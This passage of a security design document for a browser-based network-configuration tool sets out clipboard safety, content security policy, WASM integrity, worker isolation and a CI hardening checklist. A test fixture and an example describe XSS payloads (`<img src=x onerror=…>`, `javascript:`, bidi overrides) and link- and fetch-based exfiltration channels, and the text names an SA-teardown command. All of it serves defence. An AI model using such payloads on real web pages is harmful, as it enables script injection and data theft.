| Emit | The emitter produces `(line, provenance)` pairs. If a description round-trips into emitted config, §6.3 C6's byte check passes — the payload is printable ASCII — and the engineer sees exactly what they will paste |
| Findings | `ipsec.pfs.absent` fires, because side 2's rule is what this capture is actually missing. The injected description was never the interesting part |
| If R2 were violated | The `<img>` loads, `onerror` runs, and `fetch` is blocked by `connect-src`. **And the image request itself would have been blocked by `img-src`.** Two independent layers had to fail before anything left, and neither is the primary control — the primary control is that no markup was ever built |

The last row is the shape of every control in this document: **layered, with the innermost layer
being a structural property rather than a filter.**

---

## 6. The clipboard is a primary interface

### 6.1 Why this section is long

Invariant 2: the application never touches a network device. Every useful output ends its life on a
clipboard and then in a terminal, a change ticket, a chat message or a wiki page (`31` §6.5). That
is not a limitation being worked around — it is the delivery mechanism, and it is the interface the
product is judged on.

Which means the clipboard gets the design attention a network client would get in a tool that had
one. `31` §6.5 correctly places *what the user does afterwards* outside the model. This section is
about everything up to that point, which is inside it.

### 6.2 The rules

| # | Rule | Why |
|---|---|---|
| **C1** | **Nothing is copied without a user gesture.** No copy on render, no copy on selection, no copy on step completion, no "we've put that on your clipboard for you" | The clipboard is shared machine state with a single slot. Writing to it destroys whatever the user had. Also: `navigator.clipboard.writeText` requires transient activation in WebKit and Gecko, so a gesture-free design is broken as well as rude |
| **C2** | **Never a real credential** (invariant 3) | There is none to copy. Emitted config carries `pre-shared-key ascii-text "<PSK>"`, verbatim from field card side 1 |
| **C3** | **`text/plain` only.** Never a `text/html` flavour, never a `ClipboardItem` with two representations | A second flavour is a second thing to review, and it is how invisible payloads and mismatched "copies pretty, pastes ugly" behaviour travel |
| **C4** | **What is copied is exactly what is displayed, byte for byte, with nothing elided** | §6.4 |
| **C5** | **The copy affordance names the scope and the highest `Risk` in the selection** | `31` §6.5: the tool cannot control what happens after, but it can make the scope legible. Three values, the card's legend, no fourth |
| **C6** | **No trailing newline. Ever.** | §6.4 |
| **C7** | **Every emitted byte is in `[\x20-\x7E\n]`** | §5.5. A copied command carrying a control character or a bidi override is a command that does something other than what it reads as |
| **C8** | **No auto-clear, no timed wipe, no "clipboard cleared for your safety"** | §6.5 |

### 6.3 What is copied

Four copy scopes, and they are different products:

| Scope | Contents | Risk shown | Trailing newline |
|---|---|---|---|
| **One command** | The command text, nothing else | The command's `Risk` from the corpus entry | **no** |
| **One config block** | The `(line, provenance)` pairs' text, in `order_hint` order, with continuation backslashes as authored | Highest `Risk` in the block | **no** |
| **A verify ladder** (brief §6.7) | The ordered commands, one per line, with the `# what to read` comment the corpus entry's `read_field` supplies | `ReadOnly` throughout, or the ladder is wrong | **no** |
| **A change ticket** | The block, plus the rollback, plus the ladder, plus a plaintext header | Highest in the whole document | **no** |

The change-ticket header reuses `17` §15.5's export header, because a change ticket is a plaintext
export and should not have a second format:

```
# Fathom — change block for CHG-2026-0211
# THIS IS PLAINTEXT. EVERY PROTECTION THE WORKSPACE HAS ENDS HERE.
#
# workspace   site-b        corpus 4.2.1   packs ipsec-core 2.9.0   build 3.1.4
# scope       1 device · 14 lines · highest risk CHANGES CONFIG
#
# VERIFY AGAINST YOUR OWN BOX BEFORE ACTING
# BOTH ENDS MUST AGREE — EVERY VALUE, EXACTLY
```

Both imperatives are the field card's own, from sides 1 and 2. They belong at the top of a copied
change block for the same reason they are on every side of the card.

**C6, expanded, because it is the rule that will be argued with.** A trailing newline in a pasted
terminal buffer executes the last line. An engineer copying `clear security ike security-associations
203.0.113.10` — field card side 3, which tears down every child SA under that peer, and on a hub is
every spoke at once — should press Enter themselves, having read it. Ending our clipboard payload
without a newline costs one keypress and removes a class of accident that the tool would otherwise
have caused. It applies to multi-line blocks too: the last line has no terminator, and the block's
label says `14 lines` so the user knows nothing was truncated.

**C7's CI check** is one line and it belongs in the emitter's test suite, not here:

```rust
#[test]
fn emitted_bytes_are_pasteable() {
    for line in emit_all_fixtures() {
        assert!(line.text.bytes().all(|b| (0x20..=0x7E).contains(&b)),
                "non-pasteable byte in emitted line: {:?}", line.text);
    }
}
```

### 6.4 Clipboard hijacking, in both directions

Two different attacks share the name.

**Outbound — pastejacking.** A page puts something on the clipboard that differs from what the user
selected, so the user pastes a command they never read. The classic form is a `copy` event handler
that rewrites the selection; the subtler form is a visible string that differs from the copied string
by a hidden character or an elision.

We are the *source* here, so the defence is not detection, it is discipline:

| Control | Effect |
|---|---|
| **No document-level `copy` listener that rewrites the selection.** The lint bans `addEventListener('copy'` outside the one copy-button module, and that module writes only what the block contains | The user's own selection is never modified |
| **C4: nothing elided.** No ellipsis, no `…`, no `show more` in a copyable block. If a block is 400 lines, the block is 400 lines tall and scrolls | The user can read everything they are about to paste. A truncated display with an untruncated copy is the attack, performed by us, by accident |
| **C7: printable ASCII only** | A hidden character cannot make the copied text differ from the read text |
| **C3: one flavour** | There is no second representation to differ from the first |

**Inbound — a hostile clipboard.** The user pastes something into Fathom that they did not read, or
that carries a `text/html` flavour built by whatever produced it.

| Control | Effect |
|---|---|
| **Read `text/plain` from the `paste` event's `DataTransfer` and ignore every other type**, including `text/html`, `text/rtf`, `Files` and vendor types | The HTML flavour never enters the application |
| **Never use `navigator.clipboard.read()` / `readText()`** — the `paste` event is the only inbound path, and `clipboard-read=()` in `Permissions-Policy` makes that structural in modes B–D | Reading the clipboard without an explicit paste is a capability we do not want and do not have |
| **`preventDefault()` on paste into any editable surface**, then insert the normalised plain text ourselves | The browser's default paste of rich content into a `contenteditable` is a markup path we are otherwise inheriting for free |
| **Every paste is an ingest, not an edit** (`17` §14.2: import is a reconciliation, never a replace) | A pasted config produces a reviewable diff against the graph, not a silent overwrite |
| **Size and shape caps before parsing** (§7.4) | A 400 MB paste is refused with a named error at the boundary, not discovered in the parser |

### 6.5 The residue, and what the UI says

After a copy, the configuration is in the OS clipboard. Depending on the machine it may also be in a
clipboard manager's history, in a cross-device sync service, in a virtual-machine host's shared
clipboard, or in a remote-desktop session's channel. We cannot see any of that and we cannot clear
any of it.

**Why we do not try:**

| Idea | Why not |
|---|---|
| Clear the clipboard after N seconds | It requires document focus and, in two engines, transient activation — so it races the user's paste and fails exactly when they alt-tabbed to their terminal, which is always. And if it worked it would destroy content the user still needed |
| Write a decoy after the paste | We cannot detect the paste |
| Warn on every copy with a dialog | Dialogs get dismissed. `31` §6.2's principle: the field card's device is one line of muted prose in the right place |

**So the product tells the truth once, at the moment of the copy, in the register the design language
specifies** — a `4px` left accent bar in the `Risk` colour of the copied block, a wash, and one line
of `#5C6772`:

```
▌ COPIED — 14 LINES · CHANGES CONFIG — NEEDS A COMMIT
  this is now in your system clipboard, and in any clipboard history or
  cross-device sync you have running. we cannot take it back.
```

Lowercase, unpunctuated at the end, the margin-tab register. It appears on the first copy of a
session and then as a persistent muted line under the copy affordance, not as a repeated toast.

The same sentence appears in the limits panel (`31` §6.8), and per that section's CI check the three
copies — application, README, review pack — are asserted byte-identical.

### 6.6 The API, and its inconsistencies

| Concern | Behaviour | What we do |
|---|---|---|
| `navigator.clipboard.writeText` | Requires transient activation in WebKit and Gecko; Chromium is more permissive. WebKit additionally rejects a write that happens after an `await` in the gesture's task <!-- VERIFY: current per-engine behaviour of writeText with respect to transient activation, document focus, and intervening await. It has changed repeatedly. --> | Compute the string **before** the click handler, synchronously, and call `writeText` as the first statement of the handler. Never `await` before the write |
| Document focus | Some engines reject a clipboard write when the document is not focused | The write is in a click handler, so the document is focused by construction |
| Failure | Returns a rejected promise | Fall back to a `<textarea>` + `document.execCommand('copy')` path, which is obsolete and still the most compatible. If both fail, select the block's text and say `press ⌘C / Ctrl+C` — never fail silently, because the user will paste whatever was on the clipboard before |
| Permissions | `clipboard-write` is auto-granted in Chromium for the active tab; the others gate on activation instead | We rely only on activation, so there is no permission prompt in any engine |

### 6.7 What the clipboard section does not claim

It does not claim the copied configuration is protected. It is not. `31` §6.5 places what happens
next outside the model entirely, and every control above is about the accuracy and legibility of what
we put there — not its confidentiality after we do.

---

## 7. Subresource integrity, workers, and WASM

### 7.1 Integrity, per mode

| Mode | The bundle | The WASM | The corpus and packs |
|---|---|---|---|
| **A** | The inline `<script>` is pinned by its SHA-256 in `script-src` (§2.5). A tampered file does not execute | Inlined as base64 in the same script, so covered by the same hash | Inlined, covered by the same hash, **and** independently signed (`12` §13) |
| **B–D** | Hashed filenames + `integrity` on every `<script>` and `<link rel=stylesheet>` + `Integrity-Policy: blocked-destinations=(script style)` so a tag without `integrity` is refused | `fetch(url, { integrity: 'sha384-…' })` piped into `WebAssembly.instantiateStreaming` | Fetched with `integrity`, **and** signature-verified in the core before use |

The WASM line matters and is easy to get wrong. `WebAssembly.instantiateStreaming` has no integrity
parameter, and the usual advice is that SRI does not cover WASM. It does, indirectly: `Request` takes
an `integrity` option, and a failed integrity check rejects the fetch before a byte reaches the
compiler.

```ts
const wasm = await WebAssembly.instantiateStreaming(
  fetch(WASM_URL, { integrity: WASM_SRI, cache: 'force-cache' }),   // both build-time constants
  imports,
);
```

**Build ordering consequence:** the HTML cannot be written until every asset it references has been
hashed, and the mode A `<meta>` policy cannot be written until the inline script is final. So the
build's last step is a rewrite pass over the document, and that pass is the one place a supply-chain
attacker would want to be. It is covered by reproducibility (`31` rows 7, 9) and by nothing else.

**What integrity does not buy:** it pins bytes to a build, and the build is what an attacker replaces
(`31` §5.1 row 7). SRI defends against a compromised CDN, and we have no CDN (§8). Its real value
here is defending against a **partially** compromised server in mode C — one that can serve a
modified asset but not modify the document — and against an operator who serves an altered client to
one user (`31` §5.1 row 2's residual).

### 7.2 The worker topology

```
┌ main thread ────────────────────────────────────────────────────────────┐
│  DOM only. No crypto. No parsing. No rule evaluation. No graph.          │
│  Holds: the rendered view, the event handlers, the copy affordance.      │
└──┬──────────────────┬──────────────────────────┬────────────────────────┘
   │ MessagePort      │ MessagePort              │ MessagePort
   ▼                  ▼                          ▼
┌ crypto worker ─┐  ┌ parse worker ───────────┐  ┌ engine worker ─────────┐
│ own WASM inst. │  │ own WASM instance       │  │ own WASM instance      │
│ Argon2id, HKDF │  │ parsers only (B12)      │  │ graph, rules, emitters │
│ AEAD seal/open │  │ max memory capped       │  │ finder index           │
│ holds KEYS     │  │ holds NO keys           │  │ holds PLAINTEXT graph  │
│ terminated     │  │ spawned per parse,      │  │ long-lived; zeroised   │
│ after unlock   │  │ terminated after        │  │ and respawned on lock  │
│ (32 §4.5)      │  │                         │  │                        │
└────────────────┘  └─────────────────────────┘  └────────────────────────┘
```

| Worker | Why it exists | Lifetime |
|---|---|---|
| **crypto** | `32` §4.5. `WebAssembly.Memory` grows and never shrinks, so a 256 MiB Argon2 arena permanently raises the tab's footprint unless the whole instance goes away. Terminating the worker is the only way to reclaim it. Secondary benefit: keys never enter the main thread's JS heap | spawned on unlock, terminated when unlock completes; respawned on `lock()` |
| **parse** | §7.3 | one per parse job, terminated on completion, on cancel, or on deadline |
| **engine** | Rule evaluation, emit and finder ranking are the long CPU jobs. On the main thread they cost frames; here they cost nothing visible. Determinism is unaffected — invariant 9 is about output, not about scheduling | long-lived; zeroised and respawned on `lock()` |

### 7.3 What running the parser in a worker actually bounds

Precision matters here, because "we run it in a worker for isolation" is usually said in a way that
implies a security boundary, and `31` §4.3 is explicit that it is not one.

**Bounds — all real, none of them confidentiality:**

| Failure | Without a worker | With one |
|---|---|---|
| **Infinite loop / pathological backtracking** on a hostile capture | The tab is frozen. **You cannot interrupt a running WASM loop on the main thread** — there is no preemption, no `AbortController` that reaches it, no way back except closing the tab | `worker.terminate()` is synchronous and unconditional. A watchdog on the main thread fires at the deadline and the job is gone. The user sees `that capture did not finish parsing in 5 s` and still has their workspace |
| **Unbounded allocation** | `memory.grow` fails in the shared instance, and per `32` §4.4 it fails as a `null`, not a crash — so the failure surfaces somewhere unrelated, later | The parse instance is created with a declared `maximum`. The allocation traps inside that instance, the worker is discarded, and the error is named at the boundary |
| **A memory-safety bug in a parser** | Safe Rust does not have use-after-free or buffer overflow, so this is about `unsafe` blocks and about WASM-level out-of-bounds, which trap | Same trap, contained to a disposable instance whose heap contains only the capture being parsed and **no keys and no graph** |
| **Main-thread responsiveness** | A 3-second parse is 3 seconds of no paint, no input, no `beforeunload` | The UI shows progress and a cancel |

**Does not bound — say this in the review pack:**

- It is **not a security boundary against JavaScript in the origin.** The channel is `postMessage`
  across the same origin; any script can drive any worker (`31` §4.3, `32` §4.5).
- It does **not** contain a logic bug. A parser that produces a wrong graph produces a wrong graph in
  a worker.
- It does **not** protect the graph from the parser, because the parser's output *is* graph input.
  The defence there is the validation pass in `14-parsers-and-ingest.md`, not the worker.

**The one confidentiality-adjacent property it does have**, and it is small: the parse worker's
linear memory contains the capture and nothing else. A heap snapshot of that worker while a capture
is being parsed contains one capture. That is the same class of benefit as §4.6's per-record keys —
it shrinks what a passive artifact captures, and buys nothing against live execution.

### 7.4 The memory model, and the caps

| Property | Value | Reason |
|---|---|---|
| `SharedArrayBuffer` | **not used** | Requires cross-origin isolation, which requires COOP+COEP **headers**, which mode A cannot deliver (`32` §20). One codebase, so nothing depends on it |
| WASM threads | **not used** | Same reason. `32` §4.3 already sets Argon2 `p = 1` for the same constraint |
| Transfer between workers | plaintext buffers move by `ArrayBuffer` **transfer**, not by structured-clone copy | A transfer detaches the source, so there is exactly one copy in existence rather than two, one of which nobody owns |
| Parse worker memory | `new WebAssembly.Memory({ initial: 16 pages, maximum: 4096 pages })` — 1 MiB to 256 MiB | A cap makes a decompression bomb trap instead of taking the tab. 256 MiB is a budget choice, not a measurement, and §11 records it as a number to revisit against the fuzz corpus |
| Engine worker memory | grows with the workspace; no fixed cap, because a legitimate large estate needs it | `17` §13 owns the size budgets |
| Crypto worker memory | Argon2 `m` from the envelope header, floor 64 MiB, cap 256 MiB (`32` §4.2) | Terminated after unlock, which is the only way it is reclaimed |

**Input caps, enforced at the boundary before a byte reaches a parser:**

| Cap | Value | Basis |
|---|---|---|
| Paste / dropped file size | 64 MiB | A budget. A `show configuration | display set` from a large chassis is large; 64 MiB is far beyond it and far below anything that threatens the cap above |
| Line count | 2 × 10⁶ | Same |
| Longest single line | 64 KiB | A `display set` line is bounded by the platform's own limits; anything longer is not a config |
| Nesting depth (curly-brace format) | 64 | Junos hierarchy does not approach this |
| Wall-clock deadline | 5 s, then terminate | Long enough that no legitimate capture trips it, short enough that a user does not think the tool has died |
| Decompressed size ratio, for archive input | 100:1, and an absolute cap of the paste limit | Decompression bombs. `31` §5.1 row 15 |

Every cap is enforced **twice**: in the Rust core, because the CLI has no worker to terminate, and by
the watchdog, because a cap inside a runaway loop is not reached.

### 7.5 WASM specifics

| Item | Detail |
|---|---|
| **Import allowlist** | `31` §12 already makes this a CI check. Concretely: `wasm-objdump -x fathom_core.wasm`, read the import section, and assert every entry is in a committed allowlist of glue functions. **No import may be capable of originating a network request.** This is the check that makes `connect-src 'none'` an architectural property rather than a header |
| **Exports** | Minimal and named. Every export is callable by any script in the origin (`31` §4.3), so an export is a capability grant. No `debug_dump_keyring`, no `set_test_salt` — `32` §16.3 already makes the test hook's absence from release artifacts a CI check |
| **Traps** | A WASM trap unwinds to the JS caller as a `RuntimeError`. The worker treats any trap as fatal, terminates itself, and reports a named error. It never retries |
| **`memory.grow` failure** | Returns `-1`, does not trap (`32` §4.4). Every allocation path checks. The user-facing message is *"this workspace needs 256 MiB and this device would not give it"* — never "wrong passphrase", never "file corrupt" |
| **Source maps** | Not shipped. A `.wasm` with DWARF sections is larger and gives a tampering attacker a map; ship stripped, publish the symbols separately alongside the reproducible build |

---

## 8. Third-party isolation

### 8.1 The target, stated exactly

> **Zero third-party JavaScript in the shipped artifact. No runtime fetch of anything, from anywhere,
> in any mode.**

Note what that sentence does **not** say. It does not say "zero third-party code", because the Rust
core links third-party crates and they compile into the artifact and they execute at runtime. Anyone
claiming zero third-party code while shipping a `Cargo.lock` with sixty entries is playing with
words, and an enterprise reviewer will notice.

The honest version is two claims with two different enforcement stories:

| Claim | Enforcement | Residual |
|---|---|---|
| **Zero third-party JavaScript at runtime** | `package.json` has an empty `dependencies` block; everything is `devDependencies`; a build-output scanner asserts no third-party module appears in the bundle | `bounded` — a build-time tool could inject, which is `31` row 9 |
| **A minimal, pinned, vetted set of Rust crates** | `cargo-deny`, `cargo-vet`, committed `Cargo.lock`, `cargo vendor` in the repository, SBOM published per release, and `32` §15.1's pinned primitive list | `material` — `31` §5.1 row 8. A small dependency set is a smaller target, not a safe one |

### 8.2 What counts as third-party runtime code

| Category | Status | Note |
|---|---|---|
| npm runtime dependencies | **zero** | The UI is hand-written TypeScript against the DOM |
| A framework | **none** | The rendering model in §5.2 is incompatible with any framework that takes an HTML template string. That is a cost — it means writing view code by hand — and it is also what makes Trusted Types free (§2.9) |
| A markdown library | **none** | `15` §6.4 compiles at build time |
| A sanitiser library | **none** | Nothing to sanitise (§5.4) |
| A diagram/graph-layout library | **the one to argue about.** Layout is a real algorithm and writing it is weeks | If one is adopted, it is vendored into the repository, reviewed, pinned to a commit, compiled into the bundle, and it must not touch the DOM — layout returns coordinates, we build the SVG (§5.6). A library that renders is rejected outright |
| Fonts from a host | **none** | §8.4, and invariant 1 |
| Icon fonts, sprite sheets | **none** | The design language forbids icons entirely |
| Analytics, telemetry, error reporting, session replay, feature flags | **none** | Invariant 1. Not "off by default" — absent |
| A polyfill service | **none** | The support matrix is stated and unsupported browsers are told so, plainly |
| A service worker from anywhere but our build | **none** | The service worker in modes B–D is ours, same-origin, hashed, and covered by `Integrity-Policy` |

### 8.3 How CI enforces it

| # | Check | Fails when |
|---|---|---|
| 1 | `dependencies` in `package.json` is `{}` | It is not |
| 2 | Bundle scanner: parse the built HTML and JS; assert every `src`, `href`, `url()`, `@import` and `new URL(…)` literal resolves to `data:` or a same-origin relative path | Any absolute URL to another origin appears |
| 3 | Hermetic build: vendor dependencies in a separate step, then build in a container with **no route**. The build must succeed | The build needs the network, which means something is fetched, which means something could be substituted |
| 4 | Runtime egress assertion in the e2e suite: after exercising every feature, `performance.getEntriesByType('resource')` contains no entry whose origin differs from the document's | Anything loaded off-origin |
| 5 | No-route integration run (`31` §12) | Any outbound connection is attempted |
| 6 | WASM import allowlist (§7.5, `31` §12) | The core imports a host function capable of originating a request |
| 7 | `cargo-deny` — advisories, licences, duplicate crates, banned crates | Any advisory, any licence outside the allowed set, any banned crate |
| 8 | SBOM diff against the previous release, attached to the release notes | An unreviewed dependency appears |

Check 3 is the one that catches the interesting case. A build that quietly downloads a font, a
weights file or a "latest" version of anything succeeds on a developer's machine and fails here.

### 8.4 Fonts — the exception that is not one

The design language names two families: Liberation Sans and DejaVu Sans Mono, with substitute stacks.
Neither may be loaded from a host (invariant 1, and §2.7's `font-src` argument).

**DECISION — subset both families to the codepoint range the product uses, ship WOFF2, and inline as
`data:` in mode A and as same-origin assets in modes B–D.**

The range: Latin-1 Supplement, the punctuation the voice needs (em-dash, the `·` used in mastheads,
`←` `→` `▌` for the accent bar and the object chain), and the box-drawing characters the field card's
structure diagrams use. Everything outside it falls back to the substitute stack, which is
metric-compatible for the sans and close enough for the mono.

| Cost | Detail |
|---|---|
| Bytes | Four faces (sans regular/bold, mono regular/bold), subset, WOFF2. In mode A they are base64, which costs a further third over binary <!-- VERIFY: measure the actual subset sizes before quoting a figure anywhere. The single-file artifact's total size is a product decision and this is an input to it. --> |
| A glyph we did not subset renders in the fallback | Visible, and mildly ugly. The fix is to widen the subset, not to load a font |
| Licence obligations | Liberation is under the SIL Open Font License; DejaVu under a Bitstream Vera-derived permissive licence. Both permit redistribution and subsetting, with attribution and naming conditions <!-- VERIFY: read both licence texts and confirm the exact attribution and reserved-name obligations before shipping a subset, and record the attribution location. --> |

**The alternative, rejected:** ship no fonts and rely on the substitute stack. It is a genuinely
reasonable position — the design language's stacks exist for exactly this — and it costs the printed-
reference quality the owner named as the requirement. Two families of four faces is a small price for
the one aesthetic constraint the brief calls hard.

---

## 9. Framing, tabnabbing, `window.opener`, `postMessage`

### 9.1 The position

Fathom is a top-level document. It is never framed, it never frames, it opens nothing, it links
nowhere, and it listens for no cross-document message. Every item below is a consequence of taking
those five statements literally rather than as defaults to be relaxed later.

### 9.2 Being framed

| Mode | Control |
|---|---|
| B–D | `frame-ancestors 'none'` in CSP, **plus** `X-Frame-Options: DENY`. The second is redundant wherever CSP3 is honoured and is one header wherever it is not |
| A | **Neither.** `<meta>` discards `frame-ancestors` (§2.8) and there is no header. `31` §5.1 row 16 records this as a `material` residual and §3.3's decision is the response: the artifact that cannot refuse to be framed holds nothing worth framing |

**Framebusting JavaScript is not the answer**, and the reason is the governing rule of this document.
A script that checks `window.top !== window.self` and reacts is defensive code in the attacker's
context: a framing page that can also inject can remove it, and a framing page that cannot inject was
already stopped by the header where the header exists.

There is one thing worth doing, and it is an availability nicety rather than a control, labelled as
such in the code:

```ts
// Not a security control. A framing attacker with script in our origin removes this line.
// It exists so an accidental embed fails loudly instead of appearing to work.
if (window.top !== window.self) {
  document.documentElement.replaceChildren();
  text(document.body, 'Fathom must not be embedded. Open it in its own tab.');
}
```

**A consequence worth noticing:** because we are never framed, we are never a third party, so none of
the storage-partitioning behaviour that applies to embedded contexts applies to us. That removes an
entire category of cross-browser behaviour from the design (§4.4).

### 9.3 Framing others

Never. `frame-src 'none'`, `child-src 'none'`, `object-src 'none'`. There is no embedded
documentation viewer, no embedded PDF, no embedded map, no OAuth popup. If a future feature wants an
embedded anything, it is a new trust boundary and it goes through the threat model, not through this
document.

### 9.4 Links out — there are none

**DECISION — the application renders no clickable external link, in any surface, ever.**

Five reasons, and the first two are sufficient on their own:

| # | Reason |
|---|---|
| 1 | **The URL strings come from content.** A rule's `sources: ["RFC 7296 §1.3.2"]` is authored by a rule-pack publisher (U5). Signing bounds who, never what (`31` §5.2). A clickable anchor built from that string is an exfiltration primitive with a signature on it |
| 2 | `23` §6.3's channel C3: a link is the exfiltration path that survives `connect-src`, because a navigation is not a fetch (§2.11 item 1) |
| 3 | Referrer leakage — mitigated by `Referrer-Policy: no-referrer`, but that is a header mode A does not have |
| 4 | Reverse tabnabbing. Modern browsers imply `rel=noopener` for `target=_blank`, so this is largely historical — but "largely" is doing work in that sentence and we do not need to rely on it |
| 5 | The design language forbids the chrome a link needs anyway |

**What renders instead:** the citation as text, in mono, selectable and copyable. `RFC 7296 §1.3.2`
is a better artifact than a hyperlink for a tool used on air-gapped machines, and the user who wants
it looks it up in the browser they already have open.

**The cost, named:** every reference in the corpus and every `sources` entry in every rule pack
becomes a manual lookup. That is a real usability loss on hundreds of citations, and it is the direct
price of closing channel C3 structurally rather than by filtering.

**If this is ever relaxed** — and it should not be — the conditions are: the href is a literal from a
build-time allowlist, never from content; `rel="noopener noreferrer"`; the visible text is the full
URL, so the user can see where they are going; and the corpus gates in `15` §10 count it.

### 9.5 `window.opener`, `window.name`, `postMessage`

| Item | Rule | Why |
|---|---|---|
| **`Cross-Origin-Opener-Policy: same-origin`** (B–D) | Set | Severs the opener relationship in both directions. A page that opened us cannot reach `window`; we cannot reach theirs. Also enables cross-origin isolation with COEP, which we do not use today and do not want to be blocked from |
| **`window.opener`** | Not read, not written | With COOP set it is `null`. In mode A it may not be, and there is nothing to do about it — which is one more row in §3.3's argument |
| **`window.name`** | Cleared on boot: `window.name = ''` | It persists across navigations and across origins, which makes it a classic covert channel for carrying data out of a document. One line |
| **`window.addEventListener('message', …)`** | **Banned by lint** (§5.7). The application registers zero global message listeners | A global `message` listener is reachable by any frame or opener. Worker communication uses `MessagePort` objects obtained from `Worker`/`MessageChannel`, which are not reachable by anyone else |
| **`window.open`, `location` assignment** | **Banned by lint**, and blocked by the `sandbox` directive in modes B–D (§2.11) | These are §2.11's channels 1 and 2. Banning them in our own code does not stop an injected script, which is why the sandbox directive carries the actual weight |
| **`target="_blank"`** | Does not occur, because §9.4 | — |

---

## 10. The hardening checklist

Work through it. Every row has a test, and a row whose test is "review" is marked as such so nobody
mistakes it for automation.

### 10.1 Policy

| # | Item | Test | Fails when |
|---|---|---|---|
| H1 | Mode A ships the exact `<meta>` policy in §2.2 | Parse the built HTML, compare the policy to a committed golden string | Any directive differs |
| H2 | Modes B–D ship the exact headers in §2.2 | `curl -sI` the built server and every asset path; compare to golden | Any header missing or differing |
| H3 | `connect-src` is `'none'` (A, B tier 0), `'self'` (C), or `'self'` + exactly the enumerated origins (D) | Golden-string check per build target (`31` §12) | Anything else, including an extra origin |
| H4 | No `'unsafe-inline'`, `'unsafe-eval'`, `'unsafe-hashes'`, `'strict-dynamic'`, or nonce in any policy | Substring assertion | Any appears |
| H5 | `'wasm-unsafe-eval'` is the only eval-adjacent keyword | Substring assertion | — |
| H6 | The `script-src` hash in mode A matches the actual inline script | Recompute SHA-256 of the script element's text; compare | Mismatch — this also catches a broken build-rewrite step |
| H7 | `img-src` and `font-src` contain no host | Substring assertion | Any scheme other than `data:` or `'self'` |
| H8 | `sandbox` present in B–D with exactly `allow-scripts allow-same-origin allow-downloads` | Golden string, **plus** a functional test that saving a workspace and opening OPFS both still work under it | Missing, or the functional test fails (see §2.11's VERIFY) |
| H9 | Framing is refused | Automated: load the built app in an iframe from a second origin in the test harness; assert it does not render | It renders (expected to *fail* in mode A — asserted as a known gap, like `31` §12's heap row) |
| H10 | Report endpoint, where present, is same-origin | Golden string | Any off-origin reporting URL |
| H11 | `Permissions-Policy` denies every listed feature | Header comparison | Any feature not denied |
| H12 | The policy is identical across every asset response, not only the document | `curl -sI` every path from the manifest | Divergence |

### 10.2 Rendering

| # | Item | Test | Fails when |
|---|---|---|---|
| H13 | The banned-sink list (§5.7) appears nowhere in source | Lint, `--max-warnings 0` | Any occurrence outside the named exemptions |
| H14 | The banned-sink list appears nowhere in the **built bundle** | `grep` over build output | Any occurrence — this catches a dependency, a generated file, or a lint config that missed a directory |
| H15 | `require-trusted-types-for` is enforced and no `default` policy exists | Runtime: in a headless run, assert `trustedTypes.defaultPolicy === null` and that assigning a string to `innerHTML` throws | A default policy exists, or the assignment succeeds |
| H16 | Every `CorpusBlock` and `Inline` kind has a renderer | `tsc` exhaustiveness (no `default` branch) | Compile error, which is the point |
| H17 | Hostile-content corpus renders as text | Golden-DOM test: a fixture graph whose every string field contains `<img src=x onerror=…>`, `</pre>`, `javascript:`, a bidi override and a tag-character payload; render every view; assert the DOM contains zero `img`/`script`/`a`/`iframe`/`object` elements and zero `on*` attributes | Any element or attribute appears |
| H18 | Invisible characters are sentinel-rendered in captures and normalised on ingest | Fixture with each class from §5.5; assert the badge appears and the graph value is clean | Silent stripping, or silent passthrough |
| H19 | Diagram export contains no script sink | Export the fixture diagram; assert the SVG contains no `script`, `foreignObject`, `use`, `image`, `a`, `style`, `href` or `on*` | Any appears |

### 10.3 Storage

| # | Item | Test | Fails when |
|---|---|---|---|
| H20 | No plaintext canary in any store | Full session with a canary string; then dump OPFS, IndexedDB, `localStorage`, `sessionStorage`, Cache API; `grep` | Found (`31` §12's storage row) |
| H21 | `localStorage`, `sessionStorage`, `document.cookie` unused | Lint + bundle grep | Any occurrence |
| H22 | Persistence is requested once and reported honestly | Assert `persist()` is called after first save; assert the limits panel reflects `persisted()`'s actual value | The UI claims persistence that `persisted()` denies |
| H23 | Eviction is survivable | Delete the OPFS tree between sessions; reopen | Anything other than the §4.3 boot path, or any message implying data loss |
| H24 | Stale cache is detected | Hand-roll a cache with an older manifest hash; reopen | The stale cache is used |
| H25 | Newer cache prompts rather than opens | Hand-roll a cache with a higher version | It opens without a typed confirmation |
| H26 | Nothing is written before unlock | Open the app, never unlock, dump storage | Anything present |
| H27 | Sign-out clears (C–D) | Sign out; dump storage | Anything remains |
| H28 | No open-record cache (§4.6) | Assert the working-set size after closing all views is zero | Any record remains open |

### 10.4 Clipboard

| # | Item | Test | Fails when |
|---|---|---|---|
| H29 | No copy without a gesture | Instrument `writeText`; run the full e2e suite; assert every call has an ancestor user-activation frame | Any gesture-free call |
| H30 | Only `text/plain` written | Instrument `ClipboardItem` and `writeText`; assert no `text/html` | Any second flavour |
| H31 | No trailing newline | Assert every copied payload in the e2e suite fails `/\n$/` | Any payload ends in a newline |
| H32 | Copied text equals displayed text, byte for byte | For every copy affordance in the suite, compare the payload to the block's `textContent` | Any difference, including an elision |
| H33 | Emitted bytes are printable ASCII + newline | Rust unit test over every emitter fixture (§6.3) | Any byte outside `[\x20-\x7E\n]` |
| H34 | No real credential is ever emitted or copied | Assert every emitted line matching a credential-bearing statement carries the placeholder form (`31` §12's export-gate row extends to copy) | A non-placeholder value appears |
| H35 | Paste reads `text/plain` only | Synthesise a paste event carrying both flavours; assert the HTML flavour is ignored | The HTML flavour is read |
| H36 | The residue line is shown, and matches the limits panel and README byte for byte | String equality across the three (`31` §6.8) | Divergence |

### 10.5 Integrity, workers, WASM, third party

| # | Item | Test | Fails when |
|---|---|---|---|
| H37 | Every script and stylesheet carries `integrity` in B–D | Parse the built HTML | Any tag without it |
| H38 | The WASM fetch carries `integrity` | Source assertion + a tampered-WASM run that must fail to instantiate | It instantiates |
| H39 | WASM import allowlist | `wasm-objdump -x`, compare to the committed allowlist (`31` §12) | Any unexpected import |
| H40 | No test hooks in release artifacts | Symbol scan (`32` §16.3) | `seal_with_salt` or equivalent present |
| H41 | Parse runs in a worker with a memory cap | Assert the parse instance's declared `maximum`; feed a decompression bomb; assert a named error and a live tab | A crash, a freeze, or an unnamed error |
| H42 | The parse deadline terminates the worker | Feed a fixture crafted to loop; assert termination at the deadline and a responsive main thread | The tab freezes |
| H43 | Input caps enforced in both places | Feed each cap's boundary case through the worker path and the CLI path | Either path accepts it |
| H44 | Zero runtime npm dependencies | `dependencies` is `{}` | It is not |
| H45 | No off-origin resource is ever requested | `performance.getEntriesByType('resource')` after the full e2e suite | Any foreign origin |
| H46 | Hermetic build | Build in a container with no route, after vendoring | The build fails |
